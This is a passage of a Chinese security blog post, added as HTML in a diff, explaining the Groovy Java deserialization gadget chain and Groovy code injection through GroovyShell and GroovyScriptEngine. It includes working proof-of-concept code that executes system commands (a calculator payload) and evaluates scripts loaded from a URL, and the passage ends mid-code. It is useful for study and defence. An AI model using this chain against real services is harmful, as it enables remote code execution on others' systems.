@@ -1,0 +1,418 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言Groovy是一种基于JVM的开发语言，具有类似于Python，Ruby，Perl和Smalltalk的功能。Groovy既可以用作Java平台的编程语言，也可以用作脚本语言。Groovy编译之后生成.class文件，与Java编译生成的无异，因此可以在JVM上运行。 在项目中可以引用Groovy的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用groovy-all。 依赖版本为gr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Groovy">
+<meta property="og:url" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/index.html">
+<meta property="og:site_name" content="H3rmesk1t">
+<meta property="og:description" content="前言Groovy是一种基于JVM的开发语言，具有类似于Python，Ruby，Perl和Smalltalk的功能。Groovy既可以用作Java平台的编程语言，也可以用作脚本语言。Groovy编译之后生成.class文件，与Java编译生成的无异，因此可以在JVM上运行。 在项目中可以引用Groovy的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用groovy-all。 依赖版本为gr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710254460793-f22b1927-42e9-40bb-9db2-aa202a14e28b.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710255432981-f30b587f-f4b2-4763-a426-0e1a6e830e86.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710256133490-fba55b71-7d9c-456c-8b3a-94699d8ed0fb.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710256155981-30f5e1b7-0849-4ce2-8f4a-ca66c4dbdeb6.png">
+<meta property="og:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710256246007-9a34471e-7576-4c4e-8802-7567b67ae084.png">
+<meta property="article:published_time" content="2023-10-01T06:52:00.000Z">
+<meta property="article:modified_time" content="2024-12-19T04:25:25.236Z">
+<meta property="article:author" content="H3rmesk1t">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://h3rmesk1t.github.io/2023/10/01/Groovy/1710254460793-f22b1927-42e9-40bb-9db2-aa202a14e28b.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/my-logo-mosaic.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/my-logo-mosaic-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/my-logo-mosaic.png">
+        
+      
+    
+    <!-- title -->
+    <title>Groovy</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="H3rmesk1t" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/10/06/Rome/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/09/25/SnakeYaml/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2023/10/01/Groovy/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&text=Groovy"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&is_video=false&description=Groovy"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Groovy&body=Check out this article: https://h3rmesk1t.github.io/2023/10/01/Groovy/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&title=Groovy"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2023/10/01/Groovy/&name=Groovy&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2023/10/01/Groovy/&t=Groovy"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MethodClosure"><span class="toc-number">2.1.</span> <span class="toc-text">MethodClosure</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#String-execute"><span class="toc-number">2.2.</span> <span class="toc-text">String.execute</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ConvertedClosure"><span class="toc-number">2.3.</span> <span class="toc-text">ConvertedClosure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9E%84%E9%80%A0"><span class="toc-number">3.</span> <span class="toc-text">利用构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">命令注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">4.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CroovyShell"><span class="toc-number">4.2.1.</span> <span class="toc-text">CroovyShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyScriptEngine"><span class="toc-number">4.2.2.</span> <span class="toc-text">GroovyScriptEngine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyScriptEvaluator"><span class="toc-number">4.2.3.</span> <span class="toc-text">GroovyScriptEvaluator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#GroovyClassLoader"><span class="toc-number">4.2.4.</span> <span class="toc-text">GroovyClassLoader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ScriptEngine"><span class="toc-number">4.2.5.</span> <span class="toc-text">ScriptEngine</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass"><span class="toc-number">4.3.</span> <span class="toc-text">Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="toc-number">4.3.1.</span> <span class="toc-text">反射机制+字符串拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Groovy%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87"><span class="toc-number">4.3.2.</span> <span class="toc-text">Groovy沙箱绕过</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Groovy
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">H3rmesk1t</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-01T06:52:00.000Z" class="dt-published" itemprop="datePublished">2023-10-01</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Java/">Java</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>, <a class="p-category" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Groovy是一种基于JVM的开发语言，具有类似于Python，Ruby，Perl和Smalltalk的功能。Groovy既可以用作Java平台的编程语言，也可以用作脚本语言。Groovy编译之后生成.class文件，与Java编译生成的无异，因此可以在JVM上运行。</p>
+<p>在项目中可以引用Groovy的相关包依赖，分为核心包和模块包，如果想依赖全部包，可以使用groovy-all。</p>
+<p>依赖版本为groovy 1.7.0-2.4.3。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h3><p>org.codehaus.groovy.runtime.MethodClosure是方法闭包，使用闭包代表了一个对象的一个方法。MethodClosure#MethodClosure方法初始化时接收两个参数，一个是对象，一个是对象的方法名称。并且MethodClosure#doCall方法调用InvokerHelper#invokeMethod方法进行方法调用。利用这个特性，可以使用MethodClosure来执行系统命令。</p>
+<p><img src="/2023/10/01/Groovy/1710254460793-f22b1927-42e9-40bb-9db2-aa202a14e28b.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(Runtime.getRuntime(), <span class="string">&quot;exec&quot;</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MethodClosure.class.getDeclaredMethod(<span class="string">&quot;doCall&quot;</span>, Object.class);</span><br><span class="line">method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">method.invoke(methodClosure, <span class="string">&quot;open -a Calculator&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="String-execute"><a href="#String-execute" class="headerlink" title="String.execute"></a>String.execute</h3><p>Groovy为String类型添加了execute方法，这个方法会返回一个Process对象。在Groovy中，可以直接使用”ls”.execute()这种方法来执行系统命令ls，本质上还是调用Runtime.getRuntime().exec(self)方法执行系统命令。</p>
+<p><img src="/2023/10/01/Groovy/1710255432981-f30b587f-f4b2-4763-a426-0e1a6e830e86.png"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MethodClosure</span> <span class="variable">execute</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">execute.call();</span><br></pre></td></tr></table></figure>
+
+<h3 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h3><p>org.codehaus.groovy.runtime.ConvertedClosure是一个通用适配器，用于将闭包适配到Java接口。ConvertedClosure实现了ConversionHandler类，ConversionHandler又实现了InvocationHandler类，因此ConvertedClosure本身就是一个动态代理类。</p>
+<p>ConvertedClosure的构造方法接收一个Closure对象和一个String类型的method方法名，也就是说ConvertedClosure会代理这个Closure对象，当调用其method方法时，将会调用ConvertedClosure父类的invoke方法，除了toString和一些默认方法外，会调用invokeCustom方法。</p>
+<p>如果初始化时指定的method与invokeCustom指定的method参数相同，则invokeCustom方法将会调用代理对象Closure的call方法执行传入参数执行。</p>
+<p><img src="/2023/10/01/Groovy/1710256133490-fba55b71-7d9c-456c-8b3a-94699d8ed0fb.png"></p>
+<p><img src="/2023/10/01/Groovy/1710256155981-30f5e1b7-0849-4ce2-8f4a-ca66c4dbdeb6.png"></p>
+<p><img src="/2023/10/01/Groovy/1710256246007-9a34471e-7576-4c4e-8802-7567b67ae084.png"></p>
+<h2 id="利用构造"><a href="#利用构造" class="headerlink" title="利用构造"></a>利用构造</h2><p>利用AnnotationInvocationHandler将ConvertedClosure代理成Map类进行反序列化。AnnotationInvocationHandler反序列化时调用memberValues中存放对象的entrySet对象，这个对象是ConvertedClosure，而这个对象又实际上是MethodClosure对象的代理，定义了在调用entrySet方法时会调用invoke方法去调用MethodClosure#call方法，触发Groovy中String类型的execute方法，执行命令。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.*;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.ConvertedClosure;</span><br><span class="line"><span class="keyword">import</span> org.codehaus.groovy.runtime.MethodClosure;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.groovy.GroovyScriptEvaluator;</span><br><span class="line"><span class="keyword">import</span> org.springframework.scripting.support.ResourceScriptSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Repeatable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Groovy</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">MethodClosure</span> <span class="variable">methodClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MethodClosure</span>(<span class="string">&quot;open -a Calculator&quot;</span>, <span class="string">&quot;execute&quot;</span>);</span><br><span class="line">        <span class="type">ConvertedClosure</span> <span class="variable">convertedClosure</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConvertedClosure</span>(methodClosure, <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, convertedClosure);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Repeatable.class, map);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(invocationHandler);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>Groovy是一种强大的编程语言，其强大的功能包括了危险的命令执行等调用。在目标服务中，如果外部可控输入Groovy代码或者外部可上传一个恶意的Groovy脚本，并且程序并未对输入的Groovy代码进行有效的过滤，那么可能会导致恶意的Groovy代码注入，从而实现RCE操作。</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">exec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="type">void</span> main(args) &#123;</span><br><span class="line">        <span class="comment">//        def command1 = &quot;whoami&quot;;</span></span><br><span class="line">        <span class="comment">//        println command1.execute();</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command1.execute()&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//        println command1.execute().text;</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command1.execute().text&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> command2 = <span class="string">&#x27;open -a Calculator&#x27;</span>;</span><br><span class="line">        println command2.execute();</span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command2.execute()&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//        println command2.execute().text;</span></span><br><span class="line">        <span class="comment">//        println &quot;$&#123;command2.execute().text&#125;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CroovyShell"><a href="#CroovyShell" class="headerlink" title="CroovyShell"></a>CroovyShell</h4><p>GroovyShell允许在Java类中（甚至Groovy类）解析任意Groovy表达式的值。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.GroovyShell;</span><br><span class="line"><span class="keyword">import</span> groovy.lang.Script;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage1</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 直接执行Groovy代码</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell.evaluate(<span class="string">&quot;\&quot;open -a Calculator\&quot;.execute()&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载本地Groovy脚本</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        <span class="type">Script</span> <span class="variable">script</span> <span class="operator">=</span> groovyShell1.parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line">        script.run();</span><br><span class="line">        groovyShell1.evaluate(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/deserialize/groovy/exec.groovy&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载远程Groovy脚本</span></span><br><span class="line">        <span class="type">GroovyShell</span> <span class="variable">groovyShell2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">        groovyShell2.evaluate(<span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://127.0.0.1:8080/exec.groovy&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="GroovyScriptEngine"><a href="#GroovyScriptEngine" class="headerlink" title="GroovyScriptEngine"></a>GroovyScriptEngine</h4><p>GroovyScriptEngine可从指定的位置（文件系统、URL、数据库等等）加载Groovy脚本，并且随着脚本变化而重新加载它们。GroovyScriptEngine构造方法存在重载的方式，可以指定远程URL&#x2F;根文件位置&#x2F;ClassLoader，之后通过使用run方法回显，有两个重载，一个是传入脚本名和对应的参数，另一个是脚本名和Binding对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.groovy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> groovy.lang.Binding;</span><br><span class="line"><span class="keyword">import</span> groovy.util.GroovyScriptEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GroovyUsage2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 通过传入根路径之后调用对应的脚本</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">groovyScriptEngine</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;src/main/java/org/example/deserialize/groovy&quot;</span>);</span><br><span class="line">        groovyScriptEngine.run(<span class="string">&quot;exec.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过调用远程url之后调用特定脚本</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> <span class="variable">groovyScriptEngine1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyScriptEngine</span>(<span class="string">&quot;http://127.0.0.1:8080/&quot;</span>);</span><br><span class="line">        groovyScriptEngine1.run(<span class="string">&quot;exec.groovy&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过Binding加载</span></span><br><span class="line">        <span class="type">GroovyScriptEngine</span> 